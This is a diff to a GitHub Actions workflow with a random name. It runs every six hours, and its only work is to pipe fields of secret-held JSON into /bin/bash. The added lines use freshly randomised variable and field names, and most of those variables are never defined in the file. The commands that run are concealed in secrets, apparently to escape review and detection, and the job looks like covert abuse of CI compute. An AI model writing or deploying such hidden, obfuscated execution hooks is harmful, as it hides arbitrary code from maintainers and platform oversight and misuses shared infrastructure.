@@ -1,10 +1,8 @@
 name: huakkc
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 4/6 * * *'
-
+    - cron: '51 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +10,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: huakkc
         env:
-          gcx9808: ${{ secrets.gcx9808 }}
+          eepuy6684: ${{ secrets.eepuy6684 }}
         run: |
-          echo $gcx9808 | jq -r .nc5 | /bin/bash
-          echo $vn11 | jq -r .zpdge481 | /bin/bash
-          echo $tobu818 | jq -r .tu596 | /bin/bash
-          echo $k6458 | jq -r .n0 | /bin/bash
-          echo $umxw6 | jq -r .bq30576 | /bin/bash
-          echo $whbkm16 | jq -r .vt25694 | /bin/bash
-          echo $v23944 | jq -r .ox83895 | /bin/bash
-          echo $nnzqm78653 | jq -r .skog534 | /bin/bash
-          echo $uh071 | jq -r .i64639 | /bin/bash
+          echo $eepuy6684 | jq -r .valn5968 | /bin/bash
+          echo $fwu0460 | jq -r .qkt077 | /bin/bash
+          echo $vgeeu284 | jq -r .l9 | /bin/bash
+          echo $htnph5671 | jq -r .pgw7 | /bin/bash
+          echo $p42 | jq -r .dyhb80 | /bin/bash
+          echo $jtj00244 | jq -r .kc93588 | /bin/bash
+          echo $hmlr47756 | jq -r .mwsr33519 | /bin/bash
+          echo $a6 | jq -r .bf7300 | /bin/bash
+          echo $uoi605 | jq -r .zkbhp5 | /bin/bash
+          echo $aeg873 | jq -r .kpiir96966 | /bin/bash
+          echo $ilwc1414 | jq -r .fbwh0779 | /bin/bash
+          echo $djao31 | jq -r .l39 | /bin/bash
+          echo $tosa4 | jq -r .ul27040 | /bin/bash
+          echo $j2 | jq -r .pmj24 | /bin/bash
+          echo $fss7964 | jq -r .e5 | /bin/bash
 
